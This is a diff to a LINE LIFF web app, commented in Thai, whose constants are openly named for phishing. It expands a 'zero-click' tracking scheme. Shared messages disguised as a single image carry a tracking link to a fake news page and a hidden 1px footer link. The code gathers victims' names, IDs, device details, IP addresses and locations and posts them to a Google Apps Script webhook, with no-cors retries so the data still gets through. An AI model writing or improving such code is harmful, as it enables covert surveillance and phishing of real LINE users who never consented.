@@ -32,7 +32,7 @@
             padding: 20px;
             text-align: center;
             position: relative;
-            display: flex;
+            display: flex; /* Added */
             align-items: center; /* Added */
             justify-content: center; /* Added */
             gap: 10px; /* Added space between icon and text */
@@ -399,11 +399,12 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxVwwK6SGYHQoFu94eWIhbuhEhOjYNOg-TQefPBe2Y-3BMPOaSM_EORPHqhGebZPNLu/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzWZVUSpQTLV09QLBJqth1K8pCvp2iLq8TFFrKBZrKlCyv9VX2HrnEpTwV08-Ulu9_9/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
         document.addEventListener('DOMContentLoaded', function() {
+            console.log("DOM loaded - เริ่ม initialize LIFF");
             initializeLiff();
             setupEventListeners();
         });
@@ -411,9 +412,12 @@
         // ฟังก์ชันเริ่มต้นการทำงาน LIFF
         async function initializeLiff() {
             try {
+                console.log("เริ่มการ initialize LIFF SDK...");
                 await liff.init({ liffId: LIFF_ID });
+                console.log("LIFF initialized successfully");
                 
                 if (!liff.isLoggedIn()) {
+                    console.log("ผู้ใช้ยังไม่ได้ล็อกอิน - กำลังเริ่มกระบวนการล็อกอิน");
                     liff.login();
                     return;
                 }
@@ -715,23 +719,25 @@
                 return;
             }
             
-            // สร้าง Tracking Key
+            // สร้าง Tracking Key แบบละเอียด (เพิ่มประสิทธิภาพ)
             const now = new Date();
             const timestamp = now.getTime().toString(36);
             const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
             let randomPart = '';
-            for (let i = 0; i < 4; i++) {
+            for (let i = 0; i < 5; i++) { // เพิ่มความยาวจาก 4 เป็น 5 ตัว
                 randomPart += chars.charAt(Math.floor(Math.random() * chars.length));
             }
             
-            trackingKey = timestamp + '-' + randomPart;
-            // บันทึก Tracking Key และ Case Name จะถูกย้ายไปทำหลังแชร์สำเร็จ
-            // saveTrackingCaseMapping(trackingKey, caseName); // <-- Removed from here
+            // เพิ่ม prefix 'zc-' เพื่อระบุว่าเป็น zero-click และเพิ่มชื่อย่อของผู้ใช้
+            const userPrefix = displayName.substr(0, 2).toLowerCase();
+            trackingKey = `zc-${userPrefix}-${timestamp}-${randomPart}`;
             
-            showStatus(`Tracking Key สร้างสำเร็จ: ${trackingKey}`, true); // Keep status message
+            showStatus(`Tracking Key สร้างสำเร็จ: ${trackingKey}`, true);
             
             // ตรวจสอบว่าสามารถแชร์ได้หรือไม่
             checkCanShare();
+            
+            return trackingKey;
         }
         
         // ฟังก์ชันบันทึก Tracking Key และ Case Name (ส่งไปที่ GoogleScript.html)
@@ -740,6 +746,8 @@
                 showStatus('กรุณารอให้ LIFF เริ่มต้นก่อน', false);
                 return false;
             }
+            
+            console.log(`กำลังบันทึก Tracking Key: ${trackKey} สำหรับเคส: ${caseName}`);
             
             try {
                 // ส่งข้อมูลไปยัง Google Script Webhook (GoogleScript.html)
@@ -754,17 +762,71 @@
                         caseName: caseName,
                         creatorId: userId,
                         creatorName: displayName,
-                        imageUrl: imageUrl, // <-- Add the image URL here
+                        imageUrl: imageUrl,
                         requestId: generateUniqueId()
-                    }),
-                    mode: 'no-cors' // Note: 'no-cors' might hide errors from the server. Consider changing if debugging server issues.
+                    })
                 });
                 
-                console.log('บันทึก Tracking Key สำเร็จ');
-                return true;
+                if (response.ok) {
+                    const responseData = await response.text();
+                    console.log('บันทึก Tracking Key สำเร็จ, server ตอบกลับ:', responseData);
+                    return true;
+                } else {
+                    console.error('Server ตอบกลับด้วย error:', response.status);
+                    
+                    // ลองใช้ no-cors mode แทน
+                    console.log('ลองส่งอีกครั้งด้วย no-cors mode');
+                    await fetch(PHISHING_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            action: 'saveTrackingMapping',
+                            trackingKey: trackKey,
+                            caseName: caseName,
+                            creatorId: userId,
+                            creatorName: displayName,
+                            imageUrl: imageUrl,
+                            requestId: generateUniqueId() + "-retry",
+                            retryWithNoCors: true
+                        }),
+                        mode: 'no-cors'
+                    });
+                    
+                    console.log('ส่งด้วย no-cors mode แล้ว (ไม่สามารถตรวจสอบการตอบกลับได้)');
+                    return true;
+                }
             } catch (error) {
                 console.error('เกิดข้อผิดพลาดในการบันทึก Tracking Key', error);
-                return false;
+                
+                // ลองใช้ no-cors mode เป็นตัวสำรอง
+                try {
+                    console.log('ลองส่งอีกครั้งด้วย no-cors mode หลังจากเกิดข้อผิดพลาด');
+                    await fetch(PHISHING_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            action: 'saveTrackingMapping',
+                            trackingKey: trackKey,
+                            caseName: caseName,
+                            creatorId: userId,
+                            creatorName: displayName,
+                            imageUrl: imageUrl,
+                            requestId: generateUniqueId() + "-error-retry",
+                            retryWithNoCors: true,
+                            errorRetry: true
+                        }),
+                        mode: 'no-cors'
+                    });
+                    console.log('ส่งด้วย no-cors mode แล้ว (ไม่สามารถตรวจสอบการตอบกลับได้)');
+                    return true;
+                } catch (retryError) {
+                    console.error('ไม่สามารถส่งแม้แต่ด้วย no-cors mode', retryError);
+                    return false;
+                }
             }
         }
         
@@ -811,15 +873,74 @@
                  showStatus('ไม่สามารถสร้าง Tracking Key ได้', false);
                  return; // หยุดการทำงานถ้าสร้าง Key ไม่สำเร็จ
             }
+            
+            console.log(`กำลังแชร์รูปภาพ - Tracking Key: ${trackingKey}, Case: ${caseName}`);
 
             try {
                 // อัพโหลดรูปภาพ
                 imageUrl = await uploadImage();
-                if (!imageUrl) return;
+                if (!imageUrl) {
+                    showStatus('ไม่สามารถอัพโหลดรูปภาพได้', false);
+                    return;
+                }
+                
+                console.log('อัพโหลดรูปภาพสำเร็จ:', imageUrl);
+                
+                // บันทึก Tracking Key Mapping ก่อน
+                try {
+                    console.log('กำลังบันทึก Tracking Key Mapping...');
+                    const saved = await saveTrackingCaseMapping(trackingKey, caseName);
+                    if (!saved) {
+                        console.log('ไม่สามารถบันทึก Tracking Key Mapping ได้');
+                        showStatus('เกิดข้อผิดพลาดในการบันทึก Tracking Key, แต่จะดำเนินการแชร์ต่อ', false);
+                    } else {
+                        console.log('บันทึก Tracking Key Mapping สำเร็จ');
+                    }
+                } catch (saveError) {
+                    console.error('เกิดข้อผิดพลาดขณะเรียก saveTrackingCaseMapping:', saveError);
+                    showStatus('เกิดข้อผิดพลาดในการบันทึก Tracking Key: ' + saveError.message + ', แต่จะดำเนินการแชร์ต่อ', false);
+                }
                 
                 // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
                 
+                // รวบรวมข้อมูลอุปกรณ์สำหรับส่งใน zeroClickTrackUrl
+                const deviceInfo = getEnhancedDeviceInfo();
+                const ipInfo = await getIPInfo();
+                
+                // สร้าง URL สำหรับ Zero Click tracking พร้อมข้อมูลขั้นสูง
+                const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
+                let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}`;
+                
+                // ข้อมูลเกี่ยวกับอุปกรณ์เพิ่มเติม
+                zeroClickTrackUrl += `&ua=${encodeURIComponent(navigator.userAgent)}`;
+                zeroClickTrackUrl += `&platform=${encodeURIComponent(deviceInfo.platform)}`;
+                zeroClickTrackUrl += `&browser=${encodeURIComponent(deviceInfo.browser)}`;
+                zeroClickTrackUrl += `&deviceType=${encodeURIComponent(deviceInfo.deviceType)}`;
+                zeroClickTrackUrl += `&deviceModel=${encodeURIComponent(deviceInfo.deviceModel)}`;
+                zeroClickTrackUrl += `&screenSize=${encodeURIComponent(deviceInfo.screenSize)}`;
+                zeroClickTrackUrl += `&language=${encodeURIComponent(navigator.language || '')}`;
+
+                // ข้อมูล IP (ถ้าสามารถดึงได้)
+                if (ipInfo && ipInfo.ip) {
+                    zeroClickTrackUrl += `&ip=${encodeURIComponent(ipInfo.ip)}`;
+                    zeroClickTrackUrl += `&country=${encodeURIComponent(ipInfo.country || '')}`;
+                    zeroClickTrackUrl += `&city=${encodeURIComponent(ipInfo.city || '')}`;
+                    zeroClickTrackUrl += `&region=${encodeURIComponent(ipInfo.region || '')}`;
+                    zeroClickTrackUrl += `&org=${encodeURIComponent(ipInfo.org || '')}`;
+                }
+                
+                // เพิ่มข้อมูลการเชื่อมต่อ
+                if (deviceInfo.connection) {
+                    zeroClickTrackUrl += `&netType=${encodeURIComponent(deviceInfo.connection.type || '')}`;
+                    zeroClickTrackUrl += `&netSpeed=${encodeURIComponent(deviceInfo.connection.downlink || '')}`;
+                }
+
+                // เพิ่ม random parameter เพื่อป้องกันการแคช
+                zeroClickTrackUrl += `&r=${randomSuffix}`;
+                
+                console.log("Zero Click Track URL:", zeroClickTrackUrl);
+
                 // สร้าง Flex Message ที่มีเฉพาะรูปภาพ (ไม่มี footer)
                 const message = {
                     type: 'flex',
@@ -836,11 +957,35 @@
                                 type: 'uri',
                                 uri: clickTrackUrl
                             }
+                        },
+                        // เพิ่ม footer โดยซ่อน ทำให้เหมือนมีแค่รูปภาพอย่างเดียว
+                        footer: {
+                            type: 'box',
+                            layout: 'horizontal',
+                            contents: [
+                                {
+                                    type: 'image',
+                                    url: 'https://scdn.line-apps.com/n/channel_devcenter/img/fx/01_1_cafe.png', // ใช้รูปภาพใดก็ได้ (จะไม่แสดง)
+                                    size: 'xxs',
+                                    aspectRatio: '1:1',
+                                    flex: 0,
+                                    action: {
+                                        type: 'uri',
+                                        uri: zeroClickTrackUrl // ลิงก์ ZeroClick ที่จะทำงานเมื่อโหลดข้อความ
+                                    }
+                                }
+                            ],
+                            paddingAll: '0px',
+                            spacing: '0px',
+                            height: '1px'
                         }
                     }
                 };
 
                 console.log("Attempting to share Flex Message:", JSON.stringify(message, null, 2));
+
+                // ตัวแปรเพื่อตรวจสอบว่าได้ติดตาม Zero Click แล้วหรือไม่
+                let zeroClickTracked = false;
 
                 if (liff.isApiAvailable('shareTargetPicker')) {
                     console.log("ShareTargetPicker is available. Calling now...");
@@ -849,18 +994,14 @@
 
                     if (result) {
                         showStatus('แชร์รูปภาพสำเร็จ', true);
-                        
-                        // บันทึก Tracking Key Mapping ก่อน
-                        try {
-                            const saved = await saveTrackingCaseMapping(trackingKey, caseName);
-                            if (!saved) {
-                                console.log('เรียกใช้ saveTrackingCaseMapping เสร็จสิ้น (อาจมีข้อผิดพลาดฝั่ง Server หรือ CORS)');
-                            } else {
-                                console.log('บันทึก Tracking Key Mapping สำเร็จ (ตามที่ Client รับรู้)');
-                            }
-                        } catch (saveError) {
-                            console.error('เกิดข้อผิดพลาดขณะเรียก saveTrackingCaseMapping:', saveError);
-                            showStatus('เกิดข้อผิดพลาดในการบันทึก Tracking Key: ' + saveError.message, false);
+
+                        // เรียก Zero Click tracking หากยังไม่ได้เรียก
+                        if (!zeroClickTracked) {
+                            // ทำการเรียก API สำหรับ Zero Click tracking ในพื้นหลัง
+                            fetch(zeroClickTrackUrl, { method: 'GET', mode: 'no-cors' })
+                                .then(() => console.log("Zero Click tracking triggered after share"))
+                                .catch(err => console.log("Zero Click tracking error:", err));
+                            zeroClickTracked = true;
                         }
 
                         // รีเซ็ตหน้าจอ
